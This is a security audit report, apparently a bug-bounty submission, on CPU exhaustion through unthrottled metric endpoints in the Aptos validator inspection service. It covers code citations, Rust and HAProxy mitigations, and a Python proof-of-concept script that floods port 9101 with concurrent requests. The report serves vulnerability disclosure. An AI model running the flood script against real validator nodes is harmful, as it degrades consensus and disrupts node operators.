# Audit Report

## Title
Inspection Service Metric Gathering CPU Exhaustion Attack on Validator Nodes

## Summary

The Aptos inspection service exposes multiple metric endpoints (`/metrics`, `/json_metrics`, `/forge_metrics`, `/consensus_health_check`) without rate limiting or caching. Each request triggers expensive system metric collection operations including CPU, disk, memory, and process information gathering. An attacker can send concurrent requests to these endpoints to exhaust CPU resources on validator nodes, degrading consensus performance.

## Finding Description

The vulnerability exists across multiple layers of the inspection service:

**1. Service Exposure Without Protection**

The inspection service is started on all validator nodes and binds to `0.0.0.0:9101` by default, making it externally accessible. [1](#0-0) 

The service is unconditionally started on validator nodes. [2](#0-1) 

**2. No Rate Limiting or Caching**

All four metric-related handlers directly call expensive gathering functions without any caching layer:
- `handle_consensus_health_check()` calls `utils::get_all_metrics()` [3](#0-2) 
- `handle_forge_metrics()` calls `utils::get_all_metrics()` [4](#0-3) 
- `handle_json_metrics_request()` calls `utils::get_encoded_metrics()` [5](#0-4) 
- `handle_metrics_request()` calls `utils::get_encoded_metrics()` [6](#0-5) 

These functions immediately call `get_metric_families()` which triggers full metric collection. [7](#0-6) 

**3. Expensive System Operations Per Request**

The `get_metric_families()` function calls `aptos_metrics_core::gather()` which iterates through all registered collectors. [8](#0-7) 

Each collector performs expensive system calls on every metric gather:

- **CpuMetricsCollector**: Locks mutex and calls `system.refresh_cpu()` to read CPU statistics [9](#0-8) 

- **DiskMetricsCollector**: Locks mutex and calls `system.refresh_disks_list()` and `system.refresh_disks()` to query filesystem information [10](#0-9) 

- **ProcessMetricsCollector**: Locks mutex and calls `system.refresh_process(pid)` to read process information [11](#0-10) 

The Aptos team acknowledges these operations can be slow by measuring collection latency with histograms that bucket up to ~41 milliseconds. [12](#0-11) 

**4. No Connection or Concurrency Limits**

The inspection service HTTP server is created with default Hyper settings and no connection limits. [13](#0-12) 

While Docker deployments may use HAProxy with global connection limits, these limits are shared across all services and do not provide per-endpoint protection. [14](#0-13) 

**Attack Scenario:**

1. Attacker identifies validator nodes (public IP addresses are known)
2. Attacker creates a botnet or uses distributed attack infrastructure
3. Attacker sends 100+ concurrent HTTP GET requests to `/metrics` and `/json_metrics` endpoints
4. Each request triggers full system metric collection with expensive OS operations
5. Validator CPU is consumed by:
   - Reading /proc filesystem entries (CPU, memory, process stats)
   - Querying disk and filesystem information
   - Mutex contention between concurrent collectors
   - Metric encoding and serialization
6. Validator becomes slow to respond to consensus messages
7. Validator misses block proposals or vote deadlines
8. Network may perceive validator as unresponsive, affecting consensus health

The developer comment "we assume that this endpoint will only be used every few seconds" indicates this attack vector was not anticipated. [15](#0-14) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program category "Validator node slowdowns" (up to $50,000).

**Specific Impacts:**

1. **Consensus Performance Degradation**: CPU exhaustion causes validators to be slow in processing consensus messages, potentially missing rounds and affecting network liveness.

2. **Resource Exhaustion**: System resources are diverted from critical consensus and transaction processing to handle malicious metric requests.

3. **Validator Reputation Damage**: Slow validators may be perceived as unreliable, affecting their stake delegation and rewards.

4. **Network-Wide Effects**: If multiple validators are attacked simultaneously, overall network performance degrades.

This breaks **Invariant #9** (Resource Limits): The inspection service does not respect computational limits, allowing unbounded CPU consumption through external requests.

## Likelihood Explanation

**Likelihood: HIGH**

1. **Low Attack Complexity**: Requires only HTTP GET requests, no authentication or special privileges
2. **Public Exposure**: Validator IPs and port 9101 are discoverable
3. **No Detection Barriers**: No rate limiting or monitoring to detect attacks early
4. **High Motivation**: Attackers could profit by degrading competitor validators or disrupting the network
5. **Low Cost**: Attack can be executed from commodity hardware or cloud infrastructure

## Recommendation

Implement multi-layered protection:

**1. Add Request Rate Limiting**

Add rate limiting configuration to `InspectionServiceConfig`:

```rust
pub struct InspectionServiceConfig {
    pub address: String,
    pub port: u16,
    pub expose_configuration: bool,
    pub expose_identity_information: bool,
    pub expose_peer_information: bool,
    pub expose_system_information: bool,
    // New fields
    pub enable_rate_limiting: bool,
    pub max_requests_per_second: u32,
    pub max_concurrent_requests: u32,
}
```

**2. Implement Caching Layer**

Cache metric results with short TTL (e.g., 1-2 seconds):

```rust
use std::sync::Arc;
use parking_lot::RwLock;
use std::time::{Duration, Instant};

struct MetricCache {
    data: Arc<RwLock<Option<(Vec<MetricFamily>, Instant)>>>,
    ttl: Duration,
}

impl MetricCache {
    fn get_or_refresh(&self) -> Vec<MetricFamily> {
        let cache = self.data.read();
        if let Some((metrics, timestamp)) = &*cache {
            if timestamp.elapsed() < self.ttl {
                return metrics.clone();
            }
        }
        drop(cache);
        
        // Refresh cache
        let fresh_metrics = aptos_metrics_core::gather();
        let mut cache = self.data.write();
        *cache = Some((fresh_metrics.clone(), Instant::now()));
        fresh_metrics
    }
}
```

**3. Add Concurrency Limits**

Use a semaphore to limit concurrent metric gathering operations:

```rust
use tokio::sync::Semaphore;

static METRIC_GATHER_SEMAPHORE: Lazy<Arc<Semaphore>> = 
    Lazy::new(|| Arc::new(Semaphore::new(2)));

pub async fn handle_metrics_request() -> (StatusCode, Body, String) {
    let permit = METRIC_GATHER_SEMAPHORE.acquire().await.unwrap();
    let buffer = utils::get_encoded_metrics(TextEncoder::new());
    drop(permit);
    (StatusCode::OK, Body::from(buffer), CONTENT_TYPE_TEXT.into())
}
```

**4. Add Network-Level Protection**

Configure HAProxy with per-endpoint rate limits:

```
backend validator-metrics
    mode http
    server validator validator:9101
    # Add rate limiting
    stick-table type ip size 100k expire 60s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 10 }
```

**5. Consider Disabling on Mainnet Validators**

Add configuration option to disable inspection service entirely on production validators, similar to how configuration exposure is restricted.

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import requests
import concurrent.futures
import time

VALIDATOR_IP = "VALIDATOR_IP_HERE"
METRICS_PORT = 9101
ENDPOINTS = ["/metrics", "/json_metrics", "/forge_metrics", "/consensus_health_check"]
CONCURRENT_REQUESTS = 100
DURATION_SECONDS = 60

def send_request(endpoint):
    try:
        start = time.time()
        response = requests.get(f"http://{VALIDATOR_IP}:{METRICS_PORT}{endpoint}", timeout=30)
        elapsed = time.time() - start
        return (endpoint, response.status_code, elapsed)
    except Exception as e:
        return (endpoint, "ERROR", str(e))

def main():
    print(f"Starting CPU exhaustion attack against {VALIDATOR_IP}:{METRICS_PORT}")
    print(f"Concurrent requests: {CONCURRENT_REQUESTS}")
    print(f"Duration: {DURATION_SECONDS} seconds")
    
    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        while time.time() - start_time < DURATION_SECONDS:
            futures = []
            for _ in range(CONCURRENT_REQUESTS):
                endpoint = ENDPOINTS[_ % len(ENDPOINTS)]
                futures.append(executor.submit(send_request, endpoint))
            
            for future in concurrent.futures.as_completed(futures):
                endpoint, status, elapsed = future.result()
                print(f"{endpoint}: {status} ({elapsed:.2f}s)")
            
            time.sleep(0.1)  # Brief pause between waves

if __name__ == "__main__":
    main()
```

**Validation Steps:**

1. Deploy the attack script against a test validator node
2. Monitor validator CPU usage: `top` or `htop`
3. Monitor consensus participation metrics: check `/consensus_health_check` endpoint from another machine
4. Observe increased latency in block proposals and votes
5. Check validator metrics: `aptos_state_sync_consensus_executing_gauge` should show degradation

**Expected Results:**
- CPU usage increases to 80-100%
- Metric gathering latency exceeds 100ms+ per request
- Consensus health check begins failing or showing delayed responses
- Validator may start missing consensus rounds

## Notes

This vulnerability exists because the inspection service was designed for low-frequency administrative monitoring, not as a public-facing production service. The default configuration of binding to `0.0.0.0` and the lack of rate limiting make it vulnerable to resource exhaustion attacks that can impact validator consensus performance.

### Citations

**File:** config/src/config/inspection_service_config.rs (L26-36)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```

**File:** aptos-node/src/services.rs (L212-222)
```rust
pub fn start_node_inspection_service(
    node_config: &NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) {
    aptos_inspection_service::start_inspection_service(
        node_config.clone(),
        aptos_data_client,
        peers_and_metadata,
    )
}
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L19-19)
```rust
/// Note: we assume that this endpoint will only be used every few seconds.
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L31-31)
```rust
    let metrics = utils::get_all_metrics();
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L53-53)
```rust
    let metrics = utils::get_all_metrics();
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L68-68)
```rust
    let buffer = utils::get_encoded_metrics(JsonEncoder);
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L74-74)
```rust
    let buffer = utils::get_encoded_metrics(TextEncoder::new());
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L26-29)
```rust
pub fn get_all_metrics() -> HashMap<String, String> {
    let metric_families = get_metric_families();
    get_metrics_map(metric_families)
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L50-51)
```rust
fn get_metric_families() -> Vec<MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
```

**File:** crates/node-resource-metrics/src/collectors/cpu_metrics_collector.rs (L70-72)
```rust
        let mut system = self.system.lock();

        system.refresh_cpu();
```

**File:** crates/node-resource-metrics/src/collectors/disk_metrics_collector.rs (L81-83)
```rust
        let mut system = self.system.lock();
        system.refresh_disks_list();
        system.refresh_disks();
```

**File:** crates/node-resource-metrics/src/collectors/process_metrics_collector.rs (L117-120)
```rust
        let mut system = self.system.lock();

        let pid = if let Ok(pid) = sysinfo::get_current_pid() {
            system.refresh_process(pid);
```

**File:** crates/node-resource-metrics/src/collectors/common.rs (L15-25)
```rust
pub static LATENCY: Lazy<HistogramVec> = Lazy::new(|| {
    HistogramVec::new(
        histogram_opts!(
            "node_resource_metrics_collect_latency_micros",
            "Latency to collect each node resource metric category.",
            exponential_buckets(/*start=*/ 10.0, /*factor=*/ 2.0, /*count=*/ 12,).unwrap(),
        ),
        &["collector"],
    )
    .unwrap()
});
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L94-99)
```rust
        runtime
            .block_on(async {
                let server = Server::bind(&address).serve(make_service);
                server.await
            })
            .unwrap();
```

**File:** docker/compose/aptos-node/haproxy.cfg (L8-12)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```
